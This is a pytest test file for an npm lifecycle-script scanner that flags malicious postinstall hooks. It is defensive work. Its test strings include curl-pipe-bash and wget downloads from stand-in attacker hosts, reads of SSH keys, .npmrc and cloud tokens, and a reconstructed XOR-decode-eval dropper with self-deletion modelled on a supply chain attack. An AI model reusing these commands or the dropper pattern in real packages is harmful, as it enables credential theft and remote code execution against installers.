"""Tests for the npm postinstall hook scanner.

Covers:
  - Each CRITICAL pattern individually
  - WARNING patterns
  - Allowlist (known-safe packages)
  - Nested node_modules traversal
  - The axios supply chain attack pattern specifically
  - Anti-forensics detection
  - Scoped packages (@scope/pkg)
  - Script file reference analysis
  - Oversized script file
  - CLI command (scan-npm)
  - JSON output format
  - NpmScanResult properties (has_critical, has_warning)
  - Error handling (invalid JSON, permission errors)
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from agentward.scan.npm_scanner import (
    NpmFinding,
    NpmScanResult,
    _analyze_lifecycle_script,
    _analyze_script_content,
    _is_allowlisted_package,
    scan_npm_directory,
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _make_node_modules(tmp_path: Path) -> Path:
    """Create a node_modules directory at tmp_path/node_modules."""
    nm = tmp_path / "node_modules"
    nm.mkdir()
    return nm


def _write_package(
    node_modules: Path,
    pkg_name: str,
    version: str = "1.0.0",
    scripts: dict | None = None,
    scope: str | None = None,
) -> Path:
    """Write a package directory with package.json into node_modules."""
    if scope:
        scope_dir = node_modules / scope
        scope_dir.mkdir(exist_ok=True)
        pkg_dir = scope_dir / pkg_name
    else:
        pkg_dir = node_modules / pkg_name
    pkg_dir.mkdir(parents=True, exist_ok=True)

    manifest = {
        "name": f"{scope}/{pkg_name}" if scope else pkg_name,
        "version": version,
    }
    if scripts:
        manifest["scripts"] = scripts

    (pkg_dir / "package.json").write_text(json.dumps(manifest), encoding="utf-8")
    return pkg_dir


# ---------------------------------------------------------------------------
# NpmScanResult property tests
# ---------------------------------------------------------------------------


class TestNpmScanResult:
    def test_empty_result(self) -> None:
        r = NpmScanResult()
        assert not r.has_critical
        assert not r.has_warning
        assert r.critical_count == 0
        assert r.warning_count == 0

    def test_has_critical(self) -> None:
        r = NpmScanResult(findings=[
            NpmFinding(
                severity="CRITICAL",
                package_name="evil",
                package_version="1.0.0",
                script_type="postinstall",
                pattern="eval_exec",
                file="x/package.json",
                line_number=1,
                evidence="eval(x)",
                description="eval detected",
            )
        ])
        assert r.has_critical
        assert not r.has_warning
        assert r.critical_count == 1
        assert r.warning_count == 0

    def test_has_warning(self) -> None:
        r = NpmScanResult(findings=[
            NpmFinding(
                severity="WARNING",
                package_name="suspicious",
                package_version="1.0.0",
                script_type="postinstall",
                pattern="unrecognized_lifecycle_script",
                file="x/package.json",
                line_number=None,
                evidence="echo done",
                description="unrecognized script",
            )
        ])
        assert not r.has_critical
        assert r.has_warning
        assert r.warning_count == 1

    def test_mixed_severity(self) -> None:
        r = NpmScanResult(findings=[
            NpmFinding(severity="CRITICAL", package_name="a", package_version="1.0", script_type="postinstall", pattern="eval_exec", file="f", line_number=1, evidence="e", description="d"),
            NpmFinding(severity="WARNING", package_name="b", package_version="1.0", script_type="postinstall", pattern="x", file="f", line_number=2, evidence="e", description="d"),
        ])
        assert r.has_critical
        assert r.has_warning
        assert r.critical_count == 1
        assert r.warning_count == 1

    def test_packages_scanned_tracks_count(self, tmp_path: Path) -> None:
        nm = _make_node_modules(tmp_path)
        _write_package(nm, "pkg-a")
        _write_package(nm, "pkg-b")
        result = scan_npm_directory(tmp_path)
        assert result.packages_scanned == 2


# ---------------------------------------------------------------------------
# Allowlist tests
# ---------------------------------------------------------------------------


class TestAllowlist:
    def test_node_gyp_rebuild_allowlisted(self) -> None:
        assert _is_allowlisted_package("some-native-addon", "node-gyp rebuild")

    def test_husky_install_allowlisted(self) -> None:
        assert _is_allowlisted_package("husky", "husky install")

    def test_husky_package_name_allowlisted(self) -> None:
        assert _is_allowlisted_package("husky", "node ./bin/install.js")

    def test_esbuild_package_allowlisted(self) -> None:
        assert _is_allowlisted_package("esbuild", "node install.js")

    def test_esbuild_scoped_allowlisted(self) -> None:
        assert _is_allowlisted_package("@esbuild/linux-x64", "node install.js")

    def test_sharp_package_allowlisted(self) -> None:
        assert _is_allowlisted_package("sharp", "node-gyp rebuild")

    def test_playwright_package_allowlisted(self) -> None:
        assert _is_allowlisted_package("playwright", "node ./install.js")

    def test_puppeteer_package_allowlisted(self) -> None:
        assert _is_allowlisted_package("puppeteer", "node install.js")

    def test_opencollective_allowlisted(self) -> None:
        assert _is_allowlisted_package("my-pkg", "opencollective postinstall")

    def test_fsevents_allowlisted(self) -> None:
        assert _is_allowlisted_package("fsevents", "node-gyp rebuild")

    def test_bcrypt_allowlisted(self) -> None:
        assert _is_allowlisted_package("bcrypt", "node-gyp rebuild")

    def test_canvas_allowlisted(self) -> None:
        assert _is_allowlisted_package("canvas", "node-gyp rebuild")

    def test_unknown_package_not_allowlisted(self) -> None:
        assert not _is_allowlisted_package("random-pkg", "node ./setup.js")

    def test_malicious_package_not_allowlisted(self) -> None:
        assert not _is_allowlisted_package(
            "plain-crypto-js", "node setup.js"
        )

    def test_sentry_cli_allowlisted(self) -> None:
        assert _is_allowlisted_package("@sentry/cli", "node ./scripts/install.js")

    def test_electron_allowlisted(self) -> None:
        assert _is_allowlisted_package("electron", "node install.js")


# ---------------------------------------------------------------------------
# CRITICAL pattern tests
# ---------------------------------------------------------------------------


class TestCriticalPatterns:
    def _check_critical(self, script_content: str, expected_pattern: str) -> None:
        findings = _analyze_script_content(
            script_content,
            pkg_name="test-pkg",
            pkg_version="1.0.0",
            script_type="postinstall",
            source_file="/fake/package.json",
        )
        critical = [f for f in findings if f.severity == "CRITICAL"]
        assert critical, f"Expected CRITICAL finding for: {script_content!r}"
        patterns = [f.pattern for f in critical]
        assert expected_pattern in patterns, f"Expected {expected_pattern!r} in {patterns}"

    def test_curl_download(self) -> None:
        self._check_critical("curl https://evil.com/payload | bash", "network_curl_wget")

    def test_wget_download(self) -> None:
        self._check_critical("wget -O /tmp/x https://attacker.io/dropper", "network_curl_wget")

    def test_https_get_node(self) -> None:
        self._check_critical("const r = https.get('https://evil.io', cb);", "network_node_http")

    def test_http_request_node(self) -> None:
        self._check_critical("http.request({host: 'evil.io'}, cb).end();", "network_node_http")

    def test_node_fetch(self) -> None:
        self._check_critical("const {default: fetch} = require('node-fetch'); fetch(url);", "network_node_http")

    def test_axios_get(self) -> None:
        self._check_critical("axios.get('https://c2.io/cmd').then(r => eval(r.data));", "network_node_http")

    def test_net_connect(self) -> None:
        self._check_critical("const c = net.connect(1234, 'evil.io');", "network_raw_socket")

    def test_dgram_socket(self) -> None:
        self._check_critical("const s = dgram.createSocket('udp4');", "network_raw_socket")

    def test_eval_direct(self) -> None:
        self._check_critical("eval(payload);", "eval_exec")

    def test_eval_with_decode(self) -> None:
        self._check_critical("eval(Buffer.from(encoded, 'base64').toString());", "eval_exec")

    def test_new_function_constructor(self) -> None:
        self._check_critical("new Function('return this')()", "function_constructor")

    def test_vm_run_in_new_context(self) -> None:
        self._check_critical("vm.runInNewContext(code, sandbox);", "vm_run")

    def test_vm_run_in_this_context(self) -> None:
        self._check_critical("vm.runInThisContext(src);", "vm_run")

    def test_buffer_from_base64(self) -> None:
        self._check_critical(
            "const code = Buffer.from(encoded, 'base64').toString('utf8');",
            "buffer_decode_chain",
        )

    def test_atob_decode(self) -> None:
        self._check_critical("const s = atob(encodedPayload);", "atob_decode")

    def test_xor_cipher_charcodeat(self) -> None:
        self._check_critical(
            "const c = str.charCodeAt(i) ^ key[i % key.length];",
            "xor_cipher",
        )

    def test_xor_cipher_fromcharcode(self) -> None:
        self._check_critical(
            "out += String.fromCharCode(data[i] ^ 0x5a);",
            "xor_cipher",
        )

    def test_self_delete_unlink(self) -> None:
        self._check_critical("fs.unlinkSync(__filename);", "self_delete")

    def test_self_delete_async(self) -> None:
        self._check_critical("fs.unlink('./postinstall.js', () => {});", "self_delete")

    def test_overwrite_package_json(self) -> None:
        self._check_critical(
            "fs.writeFileSync('./package.json', JSON.stringify(newPkg));",
            "overwrite_package_json",
        )

    def test_rename_self(self) -> None:
        self._check_critical("fs.renameSync('./setup.js', './done.js');", "rename_self")

    def test_child_process_exec(self) -> None:
        self._check_critical(
            "child_process.exec('rm -rf /tmp/x');",
            "child_process_exec",
        )

    def test_child_process_exec_sync(self) -> None:
        self._check_critical(
            "const result = child_process.execSync('whoami');",
            "child_process_exec",
        )

    def test_child_process_spawn(self) -> None:
        self._check_critical(
            "child_process.spawn('bash', ['-c', cmd]);",
            "child_process_exec",
        )

    def test_require_child_process(self) -> None:
        self._check_critical(
            "const cp = require('child_process');",
            "require_child_process",
        )

    def test_sensitive_env_home(self) -> None:
        self._check_critical(
            "const home = process.env.HOME;",
            "sensitive_env_access",
        )

    def test_sensitive_env_github_token(self) -> None:
        self._check_critical(
            "const tok = process.env.GITHUB_TOKEN;",
            "sensitive_env_access",
        )

    def test_sensitive_env_aws(self) -> None:
        self._check_critical(
            "const key = process.env.AWS_SECRET_ACCESS_KEY;",
            "sensitive_env_access",
        )

    def test_sensitive_file_ssh(self) -> None:
        self._check_critical(
            "const key = fs.readFileSync(path.join(home, '.ssh', 'id_rsa'));",
            "sensitive_file_read",
        )

    def test_sensitive_file_npmrc(self) -> None:
        self._check_critical(
            "const rc = fs.readFileSync('.npmrc', 'utf8');",
            "sensitive_file_read",
        )

    def test_base64_payload_long(self) -> None:
        b64 = "A" * 60 + "=="
        self._check_critical(f"const payload = '{b64}';", "base64_payload")

    def test_reversed_string(self) -> None:
        self._check_critical(
            "const mod = 'ssecorp/tnereffid_elbitapmoc'.split('').reverse().join('');",
            "reversed_string",
        )


# ---------------------------------------------------------------------------
# WARNING pattern tests
# ---------------------------------------------------------------------------


class TestWarningPatterns:
    def test_any_postinstall_not_allowlisted_is_warning(self, tmp_path: Path) -> None:
        nm = _make_node_modules(tmp_path)
        _write_package(nm, "random-pkg", scripts={"postinstall": "echo 'done'"})
        result = scan_npm_directory(tmp_path)
        assert result.has_warning
        w = [f for f in result.findings if f.severity == "WARNING"]
        assert w

    def test_unrecognized_postinstall_warning_pattern(self) -> None:
        findings = _analyze_lifecycle_script(
            script_value="echo installed",
            script_type="postinstall",
            pkg_name="random-pkg",
            pkg_version="1.0.0",
            pkg_dir=Path("/fake"),
        )
        warnings = [f for f in findings if f.severity == "WARNING"]
        assert warnings
        assert warnings[0].pattern == "unrecognized_lifecycle_script"

    def test_oversized_script_file_is_warning(self, tmp_path: Path) -> None:
        nm = _make_node_modules(tmp_path)
        pkg_dir = _write_package(nm, "big-script-pkg", scripts={"postinstall": "node ./big.js"})
        # Write a >10KB script file with no malicious patterns
        big_content = "// safe comment\n" * 700  # ~11KB
        (pkg_dir / "big.js").write_text(big_content, encoding="utf-8")
        result = scan_npm_directory(tmp_path)
        warnings = [f for f in result.findings if f.pattern == "oversized_script"]
        assert warnings


# ---------------------------------------------------------------------------
# Axios supply chain attack pattern tests
# ---------------------------------------------------------------------------


class TestAxiosAttackPattern:
    """Test the exact patterns from the March 2026 axios supply chain attack."""

    def test_xor_position_dependent_cipher(self) -> None:
        """Test the axios attack's position-dependent XOR: key[7 * i² % 10]"""
        code = """
const key = [0x12, 0x34, 0x56, 0x78, 0x9a];
for (let i = 0; i < data.length; i++) {
    result += String.fromCharCode(data.charCodeAt(i) ^ key[7 * i * i % 10]);
}
"""
        findings = _analyze_script_content(
            code,
            pkg_name="plain-crypto-js",
            pkg_version="4.2.1",
            script_type="postinstall",
            source_file="/nm/plain-crypto-js/setup.js",
        )
        critical = [f for f in findings if f.severity == "CRITICAL"]
        assert critical
        assert any(f.pattern == "xor_cipher" for f in critical)

    def test_self_deletion_after_exec(self) -> None:
        """Test anti-forensics: self-delete after executing payload."""
        code = """
require('child_process').exec(cmd, () => {
    fs.unlinkSync(__filename);
});
"""
        findings = _analyze_script_content(
            code,
            pkg_name="plain-crypto-js",
            pkg_version="4.2.1",
            script_type="postinstall",
            source_file="/nm/plain-crypto-js/setup.js",
        )
        critical = [f for f in findings if f.severity == "CRITICAL"]
        patterns = [f.pattern for f in critical]
        assert "self_delete" in patterns or "require_child_process" in patterns

    def test_full_axios_style_payload(self) -> None:
        """Full reconstruction of the axios-style dropper pattern."""
        code = """
const key = [0x2f, 0x4a, 0x11, 0x5c, 0x38, 0x7b, 0x02, 0x9e, 0x44, 0x1d];
const enc = Buffer.from('base64EncodedPayloadHere', 'base64');
let decoded = '';
for (let i = 0; i < enc.length; i++) {
    decoded += String.fromCharCode(enc[i] ^ key[7 * i * i % 10]);
}
eval(decoded);
fs.unlinkSync(__filename);
"""
        findings = _analyze_script_content(
            code,
            pkg_name="plain-crypto-js",
            pkg_version="4.2.1",
            script_type="postinstall",
            source_file="/nm/plain-crypto-js/setup.js",
        )
        critical = [f for f in findings if f.severity == "CRITICAL"]
        assert len(critical) >= 2, f"Expected ≥2 CRITICAL findings, got {len(critical)}: {[f.pattern for f in critical]}"
        patterns = {f.pattern for f in critical}
        # Should detect at least xor_cipher and eval_exec or buffer_decode_chain
        assert "xor_cipher" in patterns or "buffer_decode_chain" in patterns
        assert "eval_exec" in patterns or "self_delete" in patterns

    def test_plain_crypto_js_package(self, tmp_path: Path) -> None:
        """Test that plain-crypto-js-like package triggers CRITICAL."""
        nm = _make_node_modules(tmp_path)
        pkg_dir = _write_package(
            nm,
            "plain-crypto-js",
            version="4.2.1",
            scripts={"postinstall": "node setup.js"},
        )
        malicious = """
const key = [1,2,3];
for (let i = 0; i < data.length; i++) {
    out += String.fromCharCode(data.charCodeAt(i) ^ key[i % key.length]);
}
eval(out);
"""
        (pkg_dir / "setup.js").write_text(malicious, encoding="utf-8")
        result = scan_npm_directory(tmp_path)
        assert result.has_critical


# ---------------------------------------------------------------------------
# Anti-forensics detection
# ---------------------------------------------------------------------------


class TestAntiForesics:
    def test_unlink_self(self) -> None:
        findings = _analyze_script_content(
            "fs.unlinkSync('./postinstall.js');",
            pkg_name="evil",
            pkg_version="1.0",
            script_type="postinstall",
            source_file="/fake/package.json",
        )
        assert any(f.pattern == "self_delete" for f in findings)

    def test_unlink_async(self) -> None:
        findings = _analyze_script_content(
            "fs.unlink('setup.js', () => {});",
            pkg_name="evil",
            pkg_version="1.0",
            script_type="postinstall",
            source_file="/fake/package.json",
        )
        assert any(f.pattern == "self_delete" for f in findings)

    def test_write_own_package_json(self) -> None:
        findings = _analyze_script_content(
            "fs.writeFileSync('package.json', '{}');",
            pkg_name="evil",
            pkg_version="1.0",
            script_type="postinstall",
            source_file="/fake/package.json",
        )
        assert any(f.pattern == "overwrite_package_json" for f in findings)

    def test_rename_script(self) -> None:
        findings = _analyze_script_content(
            "fs.renameSync('./setup.js', './done.js');",
            pkg_name="evil",
            pkg_version="1.0",
            script_type="postinstall",
            source_file="/fake/package.json",
        )
        assert any(f.pattern == "rename_self" for f in findings)


# ---------------------------------------------------------------------------
# Nested node_modules traversal
# ---------------------------------------------------------------------------


class TestNestedNodeModules:
    def test_nested_node_modules_scanned(self, tmp_path: Path) -> None:
        nm = _make_node_modules(tmp_path)
        # Top-level clean package
        _write_package(nm, "clean-pkg")
        # Nested malicious package inside clean-pkg
        nested_nm = nm / "clean-pkg" / "node_modules"
        nested_nm.mkdir(parents=True)
        _write_package(nested_nm, "evil-nested", scripts={"postinstall": "eval(x)"})
        result = scan_npm_directory(tmp_path)
        assert result.packages_scanned >= 2
        critical = [f for f in result.findings if f.severity == "CRITICAL"]
        assert critical

    def test_scoped_package_scanned(self, tmp_path: Path) -> None:
        nm = _make_node_modules(tmp_path)
        _write_package(nm, "evil-pkg", scope="@evil", scripts={"postinstall": "eval(x)"})
        result = scan_npm_directory(tmp_path)
        assert result.has_critical

    def test_deeply_nested_packages_scanned(self, tmp_path: Path) -> None:
        nm = _make_node_modules(tmp_path)
        # 3 levels of nesting
        l1 = nm / "level1"
        l1.mkdir()
        (l1 / "package.json").write_text('{"name":"level1","version":"1.0"}')
        l1_nm = l1 / "node_modules"
        l1_nm.mkdir()
        l2 = l1_nm / "level2"
        l2.mkdir()
        (l2 / "package.json").write_text(
            json.dumps({"name": "level2", "version": "1.0", "scripts": {"postinstall": "eval(x)"}})
        )
        result = scan_npm_directory(tmp_path)
        assert result.has_critical


# ---------------------------------------------------------------------------
# Script file reference tests
# ---------------------------------------------------------------------------


class TestScriptFileReference:
    def test_js_file_reference_analyzed(self, tmp_path: Path) -> None:
        nm = _make_node_modules(tmp_path)
        pkg_dir = _write_package(nm, "ref-pkg", scripts={"postinstall": "node ./scripts/post.js"})
        scripts_dir = pkg_dir / "scripts"
        scripts_dir.mkdir()
        (scripts_dir / "post.js").write_text(
            "const cp = require('child_process'); cp.exec('whoami');",
            encoding="utf-8",
        )
        result = scan_npm_directory(tmp_path)
        assert result.has_critical

    def test_missing_referenced_file_is_warning(self, tmp_path: Path) -> None:
        nm = _make_node_modules(tmp_path)
        _write_package(nm, "ghost-script", scripts={"postinstall": "node ./nonexistent.js"})
        result = scan_npm_directory(tmp_path)
        # Missing file should generate a warning (read_error) or an unrecognized warning
        assert result.findings  # at least one finding

    def test_clean_js_file_no_findings_except_allowlist_warning(self, tmp_path: Path) -> None:
        nm = _make_node_modules(tmp_path)
        pkg_dir = _write_package(nm, "clean-js", scripts={"postinstall": "node ./clean.js"})
        (pkg_dir / "clean.js").write_text(
            "console.log('all done');",
            encoding="utf-8",
        )
        result = scan_npm_directory(tmp_path)
        # clean-js is not allowlisted, so should get WARNING
        warnings = [f for f in result.findings if f.severity == "WARNING"]
        assert warnings


# ---------------------------------------------------------------------------
# Clean packages (no lifecycle scripts)
# ---------------------------------------------------------------------------


class TestCleanPackages:
    def test_no_scripts_no_findings(self, tmp_path: Path) -> None:
        nm = _make_node_modules(tmp_path)
        _write_package(nm, "clean-pkg")
        result = scan_npm_directory(tmp_path)
        assert not result.has_critical
        assert not result.has_warning

    def test_only_build_script_no_lifecycle(self, tmp_path: Path) -> None:
        nm = _make_node_modules(tmp_path)
        _write_package(nm, "build-only", scripts={"build": "tsc", "test": "jest"})
        result = scan_npm_directory(tmp_path)
        assert not result.has_critical
        assert not result.has_warning

    def test_allowlisted_package_no_findings(self, tmp_path: Path) -> None:
        nm = _make_node_modules(tmp_path)
        _write_package(nm, "node-gyp", scripts={"postinstall": "node-gyp rebuild"})
        result = scan_npm_directory(tmp_path)
        assert not result.has_critical
        assert not result.has_warning


# ---------------------------------------------------------------------------
# Preinstall and install scripts
# ---------------------------------------------------------------------------


class TestOtherLifecycleScripts:
    def test_preinstall_curl_is_critical(self, tmp_path: Path) -> None:
        nm = _make_node_modules(tmp_path)
        _write_package(nm, "evil", scripts={"preinstall": "curl https://evil.io/x | bash"})
        result = scan_npm_directory(tmp_path)
        assert result.has_critical
        f = result.findings[0]
        assert f.script_type == "preinstall"

    def test_install_eval_is_critical(self, tmp_path: Path) -> None:
        nm = _make_node_modules(tmp_path)
        _write_package(nm, "evil", scripts={"install": "eval(process.env.SECRET)"})
        result = scan_npm_directory(tmp_path)
        assert result.has_critical


# ---------------------------------------------------------------------------
# Error handling
# ---------------------------------------------------------------------------


class TestErrorHandling:
    def test_invalid_json_is_skipped_with_error(self, tmp_path: Path) -> None:
        nm = _make_node_modules(tmp_path)
        pkg_dir = nm / "broken-pkg"
        pkg_dir.mkdir()
        (pkg_dir / "package.json").write_text("NOT JSON", encoding="utf-8")
        result = scan_npm_directory(tmp_path)
        assert any("broken-pkg" in e for e in result.errors)

    def test_no_node_modules_directory(self, tmp_path: Path) -> None:
        result = scan_npm_directory(tmp_path / "nonexistent")
        assert result.errors

    def test_empty_node_modules(self, tmp_path: Path) -> None:
        nm = _make_node_modules(tmp_path)
        result = scan_npm_directory(tmp_path)
        assert result.packages_scanned == 0
        assert not result.has_critical

    def test_project_root_finds_node_modules(self, tmp_path: Path) -> None:
        """scan_npm_directory should find node_modules/ inside a project root."""
        nm = _make_node_modules(tmp_path)
        _write_package(nm, "any-pkg")
        result = scan_npm_directory(tmp_path)  # Pass project root
        assert result.packages_scanned == 1


# ---------------------------------------------------------------------------
# Multiple findings in one package
# ---------------------------------------------------------------------------


class TestMultipleFindings:
    def test_multiple_patterns_in_one_file(self) -> None:
        code = """
const cp = require('child_process');
eval(payload);
fs.unlinkSync(__filename);
"""
        findings = _analyze_script_content(
            code,
            pkg_name="evil",
            pkg_version="1.0",
            script_type="postinstall",
            source_file="/fake/setup.js",
        )
        critical = [f for f in findings if f.severity == "CRITICAL"]
        # Each line with a CRITICAL pattern gets its own finding
        assert len(critical) >= 2

    def test_findings_have_correct_package_info(self) -> None:
        findings = _analyze_script_content(
            "eval(x);",
            pkg_name="test-pkg",
            pkg_version="2.3.4",
            script_type="install",
            source_file="/nm/test-pkg/package.json",
        )
        assert findings
        f = findings[0]
        assert f.package_name == "test-pkg"
        assert f.package_version == "2.3.4"
        assert f.script_type == "install"

    def test_evidence_truncated_to_200_chars(self) -> None:
        long_line = "eval(" + "x" * 250 + ");"
        findings = _analyze_script_content(
            long_line,
            pkg_name="p",
            pkg_version="1",
            script_type="postinstall",
            source_file="/f",
        )
        assert findings
        assert len(findings[0].evidence) <= 200


# ---------------------------------------------------------------------------
# CLI tests
# ---------------------------------------------------------------------------


class TestNpmScanCLI:
    def test_scan_npm_command_clean_dir(self, tmp_path: Path) -> None:
        from typer.testing import CliRunner

        from agentward.cli import app

        nm = _make_node_modules(tmp_path)
        _write_package(nm, "safe-pkg")

        runner = CliRunner()
        result = runner.invoke(app, ["scan-npm", str(tmp_path)])
        assert result.exit_code == 0

    def test_scan_npm_command_json_output(self, tmp_path: Path) -> None:
        import json as _json

        from typer.testing import CliRunner

        from agentward.cli import app

        nm = _make_node_modules(tmp_path)
        _write_package(nm, "safe-pkg")

        runner = CliRunner()
        result = runner.invoke(app, ["scan-npm", "--json", str(tmp_path)])
        assert result.exit_code == 0
        data = _json.loads(result.output)
        assert "packages_scanned" in data
        assert "findings" in data

    def test_scan_npm_exits_2_on_critical(self, tmp_path: Path) -> None:
        from typer.testing import CliRunner

        from agentward.cli import app

        nm = _make_node_modules(tmp_path)
        _write_package(nm, "evil-pkg", scripts={"postinstall": "eval(x)"})

        runner = CliRunner()
        result = runner.invoke(app, ["scan-npm", str(tmp_path)])
        assert result.exit_code == 2

    def test_scan_npm_exits_1_on_warning_with_flag(self, tmp_path: Path) -> None:
        from typer.testing import CliRunner

        from agentward.cli import app

        nm = _make_node_modules(tmp_path)
        _write_package(nm, "warning-pkg", scripts={"postinstall": "echo done"})

        runner = CliRunner()
        result = runner.invoke(app, ["scan-npm", "--fail-on-warn", str(tmp_path)])
        assert result.exit_code in (1, 2)

    def test_scan_npm_json_findings_have_required_fields(self, tmp_path: Path) -> None:
        import json as _json

        from typer.testing import CliRunner

        from agentward.cli import app

        nm = _make_node_modules(tmp_path)
        _write_package(nm, "evil-pkg", scripts={"postinstall": "eval(x)"})

        runner = CliRunner()
        result = runner.invoke(app, ["scan-npm", "--json", str(tmp_path)])
        assert result.exit_code in (0, 2)
        data = _json.loads(result.output)
        assert isinstance(data["findings"], list)
        if data["findings"]:
            f = data["findings"][0]
            assert "severity" in f
            assert "package_name" in f
            assert "pattern" in f
            assert "description" in f
